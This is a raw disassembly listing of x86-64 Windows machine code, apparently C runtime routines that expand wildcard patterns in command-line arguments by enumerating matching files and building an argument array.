   140006424:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   140006428:	48 3b e9             	cmp    %rcx,%rbp
   14000642b:	76 42                	jbe    0x14000646f
   14000642d:	38 5f 28             	cmp    %bl,0x28(%rdi)
   140006430:	74 0c                	je     0x14000643e
   140006432:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   140006436:	e8 35 fd ff ff       	call   0x140006170
   14000643b:	88 5f 28             	mov    %bl,0x28(%rdi)
   14000643e:	48 8b cd             	mov    %rbp,%rcx
   140006441:	e8 52 fc ff ff       	call   0x140006098
   140006446:	48 89 47 10          	mov    %rax,0x10(%rdi)
   14000644a:	48 8b cb             	mov    %rbx,%rcx
   14000644d:	48 f7 d8             	neg    %rax
   140006450:	1b d2                	sbb    %edx,%edx
   140006452:	f7 d2                	not    %edx
   140006454:	83 e2 0c             	and    $0xc,%edx
   140006457:	48 0f 44 cd          	cmove  %rbp,%rcx
   14000645b:	85 d2                	test   %edx,%edx
   14000645d:	0f 94 c0             	sete   %al
   140006460:	88 47 28             	mov    %al,0x28(%rdi)
   140006463:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   140006467:	85 d2                	test   %edx,%edx
   140006469:	0f 85 62 ff ff ff    	jne    0x1400063d1
   14000646f:	48 8b 47 10          	mov    0x10(%rdi),%rax
   140006473:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140006477:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   14000647c:	4c 8b c6             	mov    %rsi,%r8
   14000647f:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140006484:	33 d2                	xor    %edx,%edx
   140006486:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   14000648a:	41 8b ce             	mov    %r14d,%ecx
   14000648d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006492:	e8 81 14 00 00       	call   0x140007918
   140006497:	48 63 c8             	movslq %eax,%rcx
   14000649a:	85 c0                	test   %eax,%eax
   14000649c:	0f 84 69 ff ff ff    	je     0x14000640b
   1400064a2:	48 ff c9             	dec    %rcx
   1400064a5:	48 89 4f 20          	mov    %rcx,0x20(%rdi)
   1400064a9:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400064ae:	8b c3                	mov    %ebx,%eax
   1400064b0:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400064b5:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1400064ba:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   1400064bf:	48 83 c4 40          	add    $0x40,%rsp
   1400064c3:	41 5e                	pop    %r14
   1400064c5:	c3                   	ret
   1400064c6:	cc                   	int3
   1400064c7:	cc                   	int3
   1400064c8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400064cd:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400064d2:	55                   	push   %rbp
   1400064d3:	56                   	push   %rsi
   1400064d4:	57                   	push   %rdi
   1400064d5:	41 54                	push   %r12
   1400064d7:	41 55                	push   %r13
   1400064d9:	41 56                	push   %r14
   1400064db:	41 57                	push   %r15
   1400064dd:	48 8b ec             	mov    %rsp,%rbp
   1400064e0:	48 83 ec 60          	sub    $0x60,%rsp
   1400064e4:	33 ff                	xor    %edi,%edi
   1400064e6:	48 8b d9             	mov    %rcx,%rbx
   1400064e9:	48 85 d2             	test   %rdx,%rdx
   1400064ec:	75 16                	jne    0x140006504
   1400064ee:	e8 9d f4 ff ff       	call   0x140005990
   1400064f3:	8d 5f 16             	lea    0x16(%rdi),%ebx
   1400064f6:	89 18                	mov    %ebx,(%rax)
   1400064f8:	e8 73 f3 ff ff       	call   0x140005870
   1400064fd:	8b c3                	mov    %ebx,%eax
   1400064ff:	e9 a0 01 00 00       	jmp    0x1400066a4
   140006504:	0f 57 c0             	xorps  %xmm0,%xmm0
   140006507:	48 89 3a             	mov    %rdi,(%rdx)
   14000650a:	48 8b 01             	mov    (%rcx),%rax
   14000650d:	f3 0f 7f 45 e0       	movdqu %xmm0,-0x20(%rbp)
   140006512:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
   140006516:	48 85 c0             	test   %rax,%rax
   140006519:	74 56                	je     0x140006571
   14000651b:	48 8d 55 50          	lea    0x50(%rbp),%rdx
   14000651f:	66 c7 45 50 2a 3f    	movw   $0x3f2a,0x50(%rbp)
   140006525:	48 8b c8             	mov    %rax,%rcx
   140006528:	40 88 7d 52          	mov    %dil,0x52(%rbp)
   14000652c:	e8 4f 34 00 00       	call   0x140009980
   140006531:	48 8b 0b             	mov    (%rbx),%rcx
   140006534:	48 85 c0             	test   %rax,%rax
   140006537:	75 10                	jne    0x140006549
   140006539:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   14000653d:	45 33 c0             	xor    %r8d,%r8d
   140006540:	33 d2                	xor    %edx,%edx
   140006542:	e8 8d 01 00 00       	call   0x1400066d4
   140006547:	eb 0c                	jmp    0x140006555
   140006549:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   14000654d:	48 8b d0             	mov    %rax,%rdx
   140006550:	e8 07 03 00 00       	call   0x14000685c
   140006555:	8b f0                	mov    %eax,%esi
   140006557:	85 c0                	test   %eax,%eax
   140006559:	75 09                	jne    0x140006564
   14000655b:	48 83 c3 08          	add    $0x8,%rbx
   14000655f:	48 8b 03             	mov    (%rbx),%rax
   140006562:	eb b2                	jmp    0x140006516
   140006564:	4c 8b 65 e8          	mov    -0x18(%rbp),%r12
   140006568:	4c 8b 7d e0          	mov    -0x20(%rbp),%r15
   14000656c:	e9 f8 00 00 00       	jmp    0x140006669
   140006571:	4c 8b 7d e0          	mov    -0x20(%rbp),%r15
   140006575:	4c 8b cf             	mov    %rdi,%r9
   140006578:	4c 8b 65 e8          	mov    -0x18(%rbp),%r12
   14000657c:	49 8b d7             	mov    %r15,%rdx
   14000657f:	49 8b c4             	mov    %r12,%rax
   140006582:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   140006586:	49 2b c7             	sub    %r15,%rax
   140006589:	4c 8b c7             	mov    %rdi,%r8
   14000658c:	4c 8b f0             	mov    %rax,%r14
   14000658f:	49 c1 fe 03          	sar    $0x3,%r14
   140006593:	49 ff c6             	inc    %r14
   140006596:	48 8d 48 07          	lea    0x7(%rax),%rcx
   14000659a:	48 c1 e9 03          	shr    $0x3,%rcx
   14000659e:	4d 3b fc             	cmp    %r12,%r15
   1400065a1:	48 0f 47 cf          	cmova  %rdi,%rcx
   1400065a5:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
   1400065a9:	48 85 c9             	test   %rcx,%rcx
   1400065ac:	74 25                	je     0x1400065d3
   1400065ae:	4c 8b 12             	mov    (%rdx),%r10
   1400065b1:	48 8b c6             	mov    %rsi,%rax
   1400065b4:	48 ff c0             	inc    %rax
   1400065b7:	41 38 3c 02          	cmp    %dil,(%r10,%rax,1)
   1400065bb:	75 f7                	jne    0x1400065b4
   1400065bd:	49 ff c1             	inc    %r9
   1400065c0:	48 83 c2 08          	add    $0x8,%rdx
   1400065c4:	4c 03 c8             	add    %rax,%r9
   1400065c7:	49 ff c0             	inc    %r8
   1400065ca:	4c 3b c1             	cmp    %rcx,%r8
   1400065cd:	75 df                	jne    0x1400065ae
   1400065cf:	4c 89 4d 50          	mov    %r9,0x50(%rbp)
   1400065d3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400065d9:	49 8b d1             	mov    %r9,%rdx
   1400065dc:	49 8b ce             	mov    %r14,%rcx
   1400065df:	e8 8c d9 ff ff       	call   0x140003f70
   1400065e4:	48 8b d8             	mov    %rax,%rbx
   1400065e7:	48 85 c0             	test   %rax,%rax
   1400065ea:	74 76                	je     0x140006662
   1400065ec:	4a 8d 14 f0          	lea    (%rax,%r14,8),%rdx
   1400065f0:	4d 8b f7             	mov    %r15,%r14
   1400065f3:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   1400065f7:	48 8b c2             	mov    %rdx,%rax
   1400065fa:	48 89 55 58          	mov    %rdx,0x58(%rbp)
   1400065fe:	4d 3b fc             	cmp    %r12,%r15
   140006601:	74 56                	je     0x140006659
   140006603:	48 8b cb             	mov    %rbx,%rcx
   140006606:	49 2b cf             	sub    %r15,%rcx
   140006609:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
   14000660d:	4d 8b 06             	mov    (%r14),%r8
   140006610:	4c 8b ee             	mov    %rsi,%r13
   140006613:	49 ff c5             	inc    %r13
   140006616:	43 38 3c 28          	cmp    %dil,(%r8,%r13,1)
   14000661a:	75 f7                	jne    0x140006613
   14000661c:	48 2b d0             	sub    %rax,%rdx
   14000661f:	49 ff c5             	inc    %r13
   140006622:	48 03 55 50          	add    0x50(%rbp),%rdx
   140006626:	4d 8b cd             	mov    %r13,%r9
   140006629:	48 8b c8             	mov    %rax,%rcx
   14000662c:	e8 cf 31 00 00       	call   0x140009800
   140006631:	85 c0                	test   %eax,%eax
   140006633:	0f 85 83 00 00 00    	jne    0x1400066bc
   140006639:	48 8b 45 58          	mov    0x58(%rbp),%rax
   14000663d:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   140006641:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
   140006645:	4a 89 04 31          	mov    %rax,(%rcx,%r14,1)
   140006649:	49 03 c5             	add    %r13,%rax
   14000664c:	49 83 c6 08          	add    $0x8,%r14
   140006650:	48 89 45 58          	mov    %rax,0x58(%rbp)
   140006654:	4d 3b f4             	cmp    %r12,%r14
   140006657:	75 b4                	jne    0x14000660d
   140006659:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000665d:	8b f7                	mov    %edi,%esi
   14000665f:	48 89 18             	mov    %rbx,(%rax)
   140006662:	33 c9                	xor    %ecx,%ecx
   140006664:	e8 07 fb ff ff       	call   0x140006170
   140006669:	49 8b dc             	mov    %r12,%rbx
   14000666c:	4d 8b f7             	mov    %r15,%r14
   14000666f:	49 2b df             	sub    %r15,%rbx
   140006672:	48 83 c3 07          	add    $0x7,%rbx
   140006676:	48 c1 eb 03          	shr    $0x3,%rbx
   14000667a:	4d 3b fc             	cmp    %r12,%r15
   14000667d:	48 0f 47 df          	cmova  %rdi,%rbx
   140006681:	48 85 db             	test   %rbx,%rbx
   140006684:	74 14                	je     0x14000669a
   140006686:	49 8b 0e             	mov    (%r14),%rcx
   140006689:	e8 e2 fa ff ff       	call   0x140006170
   14000668e:	48 ff c7             	inc    %rdi
   140006691:	4d 8d 76 08          	lea    0x8(%r14),%r14
   140006695:	48 3b fb             	cmp    %rbx,%rdi
   140006698:	75 ec                	jne    0x140006686
   14000669a:	49 8b cf             	mov    %r15,%rcx
   14000669d:	e8 ce fa ff ff       	call   0x140006170
   1400066a2:	8b c6                	mov    %esi,%eax
   1400066a4:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   1400066ab:	00 
   1400066ac:	48 83 c4 60          	add    $0x60,%rsp
   1400066b0:	41 5f                	pop    %r15
   1400066b2:	41 5e                	pop    %r14
   1400066b4:	41 5d                	pop    %r13
   1400066b6:	41 5c                	pop    %r12
   1400066b8:	5f                   	pop    %rdi
   1400066b9:	5e                   	pop    %rsi
   1400066ba:	5d                   	pop    %rbp
   1400066bb:	c3                   	ret
   1400066bc:	45 33 c9             	xor    %r9d,%r9d
   1400066bf:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400066c4:	45 33 c0             	xor    %r8d,%r8d
   1400066c7:	33 d2                	xor    %edx,%edx
   1400066c9:	33 c9                	xor    %ecx,%ecx
   1400066cb:	e8 c0 f1 ff ff       	call   0x140005890
   1400066d0:	cc                   	int3
   1400066d1:	cc                   	int3
   1400066d2:	cc                   	int3
   1400066d3:	cc                   	int3
   1400066d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400066d9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400066de:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400066e3:	57                   	push   %rdi
   1400066e4:	41 54                	push   %r12
   1400066e6:	41 55                	push   %r13
   1400066e8:	41 56                	push   %r14
   1400066ea:	41 57                	push   %r15
   1400066ec:	48 83 ec 30          	sub    $0x30,%rsp
   1400066f0:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   1400066f4:	49 8b f9             	mov    %r9,%rdi
   1400066f7:	33 f6                	xor    %esi,%esi
   1400066f9:	4d 8b f0             	mov    %r8,%r14
   1400066fc:	4c 8b ea             	mov    %rdx,%r13
   1400066ff:	4c 8b e1             	mov    %rcx,%r12
   140006702:	48 ff c5             	inc    %rbp
   140006705:	40 38 34 29          	cmp    %sil,(%rcx,%rbp,1)
   140006709:	75 f7                	jne    0x140006702
   14000670b:	ba 01 00 00 00       	mov    $0x1,%edx
   140006710:	49 8b c6             	mov    %r14,%rax
   140006713:	48 03 ea             	add    %rdx,%rbp
   140006716:	48 f7 d0             	not    %rax
   140006719:	48 3b e8             	cmp    %rax,%rbp
   14000671c:	76 20                	jbe    0x14000673e
   14000671e:	8d 42 0b             	lea    0xb(%rdx),%eax
   140006721:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140006726:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   14000672b:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140006730:	48 83 c4 30          	add    $0x30,%rsp
   140006734:	41 5f                	pop    %r15
   140006736:	41 5e                	pop    %r14
   140006738:	41 5d                	pop    %r13
   14000673a:	41 5c                	pop    %r12
   14000673c:	5f                   	pop    %rdi
   14000673d:	c3                   	ret
   14000673e:	4d 8d 78 01          	lea    0x1(%r8),%r15
   140006742:	4c 03 fd             	add    %rbp,%r15
   140006745:	49 8b cf             	mov    %r15,%rcx
   140006748:	e8 ab f9 ff ff       	call   0x1400060f8
   14000674d:	48 8b d8             	mov    %rax,%rbx
   140006750:	4d 85 f6             	test   %r14,%r14
   140006753:	74 19                	je     0x14000676e
   140006755:	4d 8b ce             	mov    %r14,%r9
   140006758:	4d 8b c5             	mov    %r13,%r8
   14000675b:	49 8b d7             	mov    %r15,%rdx
   14000675e:	48 8b c8             	mov    %rax,%rcx
   140006761:	e8 9a 30 00 00       	call   0x140009800
   140006766:	85 c0                	test   %eax,%eax
   140006768:	0f 85 d8 00 00 00    	jne    0x140006846
   14000676e:	4d 2b fe             	sub    %r14,%r15
   140006771:	4a 8d 0c 33          	lea    (%rbx,%r14,1),%rcx
   140006775:	49 8b d7             	mov    %r15,%rdx
   140006778:	4c 8b cd             	mov    %rbp,%r9
   14000677b:	4d 8b c4             	mov    %r12,%r8
   14000677e:	e8 7d 30 00 00       	call   0x140009800
   140006783:	85 c0                	test   %eax,%eax
   140006785:	0f 85 bb 00 00 00    	jne    0x140006846
   14000678b:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   14000678f:	44 8d 78 08          	lea    0x8(%rax),%r15d
   140006793:	4c 8b 77 10          	mov    0x10(%rdi),%r14
   140006797:	49 3b ce             	cmp    %r14,%rcx
   14000679a:	0f 85 9d 00 00 00    	jne    0x14000683d
   1400067a0:	48 39 37             	cmp    %rsi,(%rdi)
   1400067a3:	75 2b                	jne    0x1400067d0
   1400067a5:	41 8b d7             	mov    %r15d,%edx
   1400067a8:	8d 48 04             	lea    0x4(%rax),%ecx
   1400067ab:	e8 48 f9 ff ff       	call   0x1400060f8
   1400067b0:	33 c9                	xor    %ecx,%ecx
   1400067b2:	48 89 07             	mov    %rax,(%rdi)
   1400067b5:	e8 b6 f9 ff ff       	call   0x140006170
   1400067ba:	48 8b 0f             	mov    (%rdi),%rcx
   1400067bd:	48 85 c9             	test   %rcx,%rcx
   1400067c0:	74 42                	je     0x140006804
   1400067c2:	48 8d 41 20          	lea    0x20(%rcx),%rax
   1400067c6:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   1400067ca:	48 89 47 10          	mov    %rax,0x10(%rdi)
   1400067ce:	eb 6d                	jmp    0x14000683d
   1400067d0:	4c 2b 37             	sub    (%rdi),%r14
   1400067d3:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400067da:	ff ff 7f 
   1400067dd:	49 c1 fe 03          	sar    $0x3,%r14
   1400067e1:	4c 3b f0             	cmp    %rax,%r14
   1400067e4:	77 1e                	ja     0x140006804
   1400067e6:	48 8b 0f             	mov    (%rdi),%rcx
   1400067e9:	4b 8d 2c 36          	lea    (%r14,%r14,1),%rbp
   1400067ed:	48 8b d5             	mov    %rbp,%rdx
   1400067f0:	4d 8b c7             	mov    %r15,%r8
   1400067f3:	e8 3c 21 00 00       	call   0x140008934
   1400067f8:	48 85 c0             	test   %rax,%rax
   1400067fb:	75 22                	jne    0x14000681f
   1400067fd:	33 c9                	xor    %ecx,%ecx
   1400067ff:	e8 6c f9 ff ff       	call   0x140006170
   140006804:	48 8b cb             	mov    %rbx,%rcx
   140006807:	e8 64 f9 ff ff       	call   0x140006170
   14000680c:	be 0c 00 00 00       	mov    $0xc,%esi
   140006811:	33 c9                	xor    %ecx,%ecx
   140006813:	e8 58 f9 ff ff       	call   0x140006170
   140006818:	8b c6                	mov    %esi,%eax
   14000681a:	e9 02 ff ff ff       	jmp    0x140006721
   14000681f:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   140006823:	48 89 07             	mov    %rax,(%rdi)
   140006826:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   14000682a:	48 8d 0c e8          	lea    (%rax,%rbp,8),%rcx
   14000682e:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   140006832:	33 c9                	xor    %ecx,%ecx
   140006834:	e8 37 f9 ff ff       	call   0x140006170
   140006839:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   14000683d:	48 89 19             	mov    %rbx,(%rcx)
   140006840:	4c 01 7f 08          	add    %r15,0x8(%rdi)
   140006844:	eb cb                	jmp    0x140006811
   140006846:	45 33 c9             	xor    %r9d,%r9d
   140006849:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000684e:	45 33 c0             	xor    %r8d,%r8d
   140006851:	33 d2                	xor    %edx,%edx
   140006853:	33 c9                	xor    %ecx,%ecx
   140006855:	e8 36 f0 ff ff       	call   0x140005890
   14000685a:	cc                   	int3
   14000685b:	cc                   	int3
   14000685c:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140006861:	55                   	push   %rbp
   140006862:	56                   	push   %rsi
   140006863:	57                   	push   %rdi
   140006864:	41 54                	push   %r12
   140006866:	41 55                	push   %r13
   140006868:	41 56                	push   %r14
   14000686a:	41 57                	push   %r15
   14000686c:	48 8d ac 24 d0 fd ff 	lea    -0x230(%rsp),%rbp
   140006873:	ff 
   140006874:	48 81 ec 30 03 00 00 	sub    $0x330,%rsp
   14000687b:	48 8b 05 7e 07 01 00 	mov    0x1077e(%rip),%rax        # 0x140017000
   140006882:	48 33 c4             	xor    %rsp,%rax
   140006885:	48 89 85 20 02 00 00 	mov    %rax,0x220(%rbp)
   14000688c:	4d 8b e0             	mov    %r8,%r12
   14000688f:	48 8b f1             	mov    %rcx,%rsi
   140006892:	48 bb 01 08 00 00 00 	movabs $0x200000000801,%rbx
   140006899:	20 00 00 
   14000689c:	48 3b d1             	cmp    %rcx,%rdx
   14000689f:	74 22                	je     0x1400068c3
   1400068a1:	8a 02                	mov    (%rdx),%al
   1400068a3:	2c 2f                	sub    $0x2f,%al
   1400068a5:	3c 2d                	cmp    $0x2d,%al
   1400068a7:	77 0a                	ja     0x1400068b3
   1400068a9:	48 0f be c0          	movsbq %al,%rax
   1400068ad:	48 0f a3 c3          	bt     %rax,%rbx
   1400068b1:	72 10                	jb     0x1400068c3
   1400068b3:	48 8b ce             	mov    %rsi,%rcx
   1400068b6:	e8 8d 34 00 00       	call   0x140009d48
   1400068bb:	48 8b d0             	mov    %rax,%rdx
   1400068be:	48 3b c6             	cmp    %rsi,%rax
   1400068c1:	75 de                	jne    0x1400068a1
   1400068c3:	44 8a 02             	mov    (%rdx),%r8b
   1400068c6:	41 80 f8 3a          	cmp    $0x3a,%r8b
   1400068ca:	75 1e                	jne    0x1400068ea
   1400068cc:	48 8d 46 01          	lea    0x1(%rsi),%rax
   1400068d0:	48 3b d0             	cmp    %rax,%rdx
   1400068d3:	74 15                	je     0x1400068ea
   1400068d5:	4d 8b cc             	mov    %r12,%r9
   1400068d8:	45 33 c0             	xor    %r8d,%r8d
   1400068db:	33 d2                	xor    %edx,%edx
   1400068dd:	48 8b ce             	mov    %rsi,%rcx
   1400068e0:	e8 ef fd ff ff       	call   0x1400066d4
   1400068e5:	e9 56 02 00 00       	jmp    0x140006b40
   1400068ea:	41 80 e8 2f          	sub    $0x2f,%r8b
   1400068ee:	33 ff                	xor    %edi,%edi
   1400068f0:	41 80 f8 2d          	cmp    $0x2d,%r8b
   1400068f4:	77 0c                	ja     0x140006902
   1400068f6:	49 0f be c0          	movsbq %r8b,%rax
   1400068fa:	48 0f a3 c3          	bt     %rax,%rbx
   1400068fe:	b0 01                	mov    $0x1,%al
   140006900:	72 03                	jb     0x140006905
   140006902:	40 8a c7             	mov    %dil,%al
   140006905:	48 2b d6             	sub    %rsi,%rdx
   140006908:	48 89 7d a0          	mov    %rdi,-0x60(%rbp)
   14000690c:	48 ff c2             	inc    %rdx
   14000690f:	48 89 7d a8          	mov    %rdi,-0x58(%rbp)
   140006913:	f6 d8                	neg    %al
   140006915:	48 89 7d b0          	mov    %rdi,-0x50(%rbp)
   140006919:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000691e:	48 89 7d b8          	mov    %rdi,-0x48(%rbp)
   140006922:	4d 1b ed             	sbb    %r13,%r13
   140006925:	48 89 7d c0          	mov    %rdi,-0x40(%rbp)
   140006929:	4c 23 ea             	and    %rdx,%r13
   14000692c:	40 88 7d c8          	mov    %dil,-0x38(%rbp)
   140006930:	33 d2                	xor    %edx,%edx
   140006932:	e8 09 d1 ff ff       	call   0x140003a40
   140006937:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000693c:	41 bf e9 fd 00 00    	mov    $0xfde9,%r15d
   140006942:	44 39 78 0c          	cmp    %r15d,0xc(%rax)
   140006946:	75 18                	jne    0x140006960
   140006948:	40 38 7c 24 48       	cmp    %dil,0x48(%rsp)
   14000694d:	74 0c                	je     0x14000695b
   14000694f:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140006954:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000695b:	45 8b c7             	mov    %r15d,%r8d
   14000695e:	eb 3a                	jmp    0x14000699a
   140006960:	e8 73 f2 ff ff       	call   0x140005bd8
   140006965:	85 c0                	test   %eax,%eax
   140006967:	75 1b                	jne    0x140006984
   140006969:	40 38 7c 24 48       	cmp    %dil,0x48(%rsp)
   14000696e:	74 0c                	je     0x14000697c
   140006970:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140006975:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000697c:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140006982:	eb 16                	jmp    0x14000699a
   140006984:	40 38 7c 24 48       	cmp    %dil,0x48(%rsp)
   140006989:	74 0c                	je     0x140006997
   14000698b:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140006990:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140006997:	44 8b c7             	mov    %edi,%r8d
   14000699a:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   14000699e:	48 8b ce             	mov    %rsi,%rcx
   1400069a1:	e8 1e f8 ff ff       	call   0x1400061c4
   1400069a6:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   1400069aa:	4c 8d 45 d0          	lea    -0x30(%rbp),%r8
   1400069ae:	85 c0                	test   %eax,%eax
   1400069b0:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   1400069b4:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400069b9:	48 0f 45 cf          	cmovne %rdi,%rcx
   1400069bd:	45 33 c9             	xor    %r9d,%r9d
   1400069c0:	33 d2                	xor    %edx,%edx
   1400069c2:	ff 15 10 68 00 00    	call   *0x6810(%rip)        # 0x14000d1d8
   1400069c8:	48 8b d8             	mov    %rax,%rbx
   1400069cb:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400069cf:	75 17                	jne    0x1400069e8
   1400069d1:	4d 8b cc             	mov    %r12,%r9
   1400069d4:	45 33 c0             	xor    %r8d,%r8d
   1400069d7:	33 d2                	xor    %edx,%edx
   1400069d9:	48 8b ce             	mov    %rsi,%rcx
   1400069dc:	e8 f3 fc ff ff       	call   0x1400066d4
   1400069e1:	8b f8                	mov    %eax,%edi
   1400069e3:	e9 47 01 00 00       	jmp    0x140006b2f
   1400069e8:	4d 8b 74 24 08       	mov    0x8(%r12),%r14
   1400069ed:	4d 2b 34 24          	sub    (%r12),%r14
   1400069f1:	49 c1 fe 03          	sar    $0x3,%r14
   1400069f5:	33 d2                	xor    %edx,%edx
   1400069f7:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   1400069fc:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140006a01:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   140006a06:	48 89 7d 80          	mov    %rdi,-0x80(%rbp)
   140006a0a:	48 89 7d 88          	mov    %rdi,-0x78(%rbp)
   140006a0e:	48 89 7d 90          	mov    %rdi,-0x70(%rbp)
   140006a12:	40 88 7d 98          	mov    %dil,-0x68(%rbp)
   140006a16:	e8 25 d0 ff ff       	call   0x140003a40
   140006a1b:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140006a20:	44 39 78 0c          	cmp    %r15d,0xc(%rax)
   140006a24:	75 18                	jne    0x140006a3e
   140006a26:	40 38 7c 24 68       	cmp    %dil,0x68(%rsp)
   140006a2b:	74 0c                	je     0x140006a39
   140006a2d:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140006a32:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140006a39:	45 8b c7             	mov    %r15d,%r8d
   140006a3c:	eb 3a                	jmp    0x140006a78
   140006a3e:	e8 95 f1 ff ff       	call   0x140005bd8
   140006a43:	85 c0                	test   %eax,%eax
   140006a45:	75 1b                	jne    0x140006a62
   140006a47:	40 38 7c 24 68       	cmp    %dil,0x68(%rsp)
   140006a4c:	74 0c                	je     0x140006a5a
   140006a4e:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140006a53:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140006a5a:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140006a60:	eb 16                	jmp    0x140006a78
   140006a62:	40 38 7c 24 68       	cmp    %dil,0x68(%rsp)
   140006a67:	74 0c                	je     0x140006a75
   140006a69:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140006a6e:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140006a75:	44 8b c7             	mov    %edi,%r8d
   140006a78:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140006a7d:	48 8d 4d fc          	lea    -0x4(%rbp),%rcx
   140006a81:	e8 b6 f8 ff ff       	call   0x14000633c
   140006a86:	4c 8b 7d 80          	mov    -0x80(%rbp),%r15
   140006a8a:	85 c0                	test   %eax,%eax
   140006a8c:	49 8b cf             	mov    %r15,%rcx
   140006a8f:	48 0f 45 cf          	cmovne %rdi,%rcx
   140006a93:	80 39 2e             	cmpb   $0x2e,(%rcx)
   140006a96:	75 11                	jne    0x140006aa9
   140006a98:	8a 41 01             	mov    0x1(%rcx),%al
   140006a9b:	84 c0                	test   %al,%al
   140006a9d:	74 20                	je     0x140006abf
   140006a9f:	3c 2e                	cmp    $0x2e,%al
   140006aa1:	75 06                	jne    0x140006aa9
   140006aa3:	40 38 79 02          	cmp    %dil,0x2(%rcx)
   140006aa7:	74 16                	je     0x140006abf
   140006aa9:	4d 8b cc             	mov    %r12,%r9
   140006aac:	4d 8b c5             	mov    %r13,%r8
   140006aaf:	48 8b d6             	mov    %rsi,%rdx
   140006ab2:	e8 1d fc ff ff       	call   0x1400066d4
   140006ab7:	8b f8                	mov    %eax,%edi
   140006ab9:	85 c0                	test   %eax,%eax
   140006abb:	75 5b                	jne    0x140006b18
   140006abd:	33 ff                	xor    %edi,%edi
   140006abf:	40 38 7d 98          	cmp    %dil,-0x68(%rbp)
   140006ac3:	74 08                	je     0x140006acd
   140006ac5:	49 8b cf             	mov    %r15,%rcx
   140006ac8:	e8 a3 f6 ff ff       	call   0x140006170
   140006acd:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   140006ad1:	48 8b cb             	mov    %rbx,%rcx
   140006ad4:	ff 15 06 67 00 00    	call   *0x6706(%rip)        # 0x14000d1e0
   140006ada:	41 bf e9 fd 00 00    	mov    $0xfde9,%r15d
   140006ae0:	85 c0                	test   %eax,%eax
   140006ae2:	0f 85 0d ff ff ff    	jne    0x1400069f5
   140006ae8:	49 8b 04 24          	mov    (%r12),%rax
   140006aec:	49 8b 54 24 08       	mov    0x8(%r12),%rdx
   140006af1:	48 2b d0             	sub    %rax,%rdx
   140006af4:	48 c1 fa 03          	sar    $0x3,%rdx
   140006af8:	4c 3b f2             	cmp    %rdx,%r14
   140006afb:	74 29                	je     0x140006b26
   140006afd:	49 2b d6             	sub    %r14,%rdx
   140006b00:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   140006b04:	4c 8d 0d a5 f6 ff ff 	lea    -0x95b(%rip),%r9        # 0x1400061b0
   140006b0b:	41 b8 08 00 00 00    	mov    $0x8,%r8d
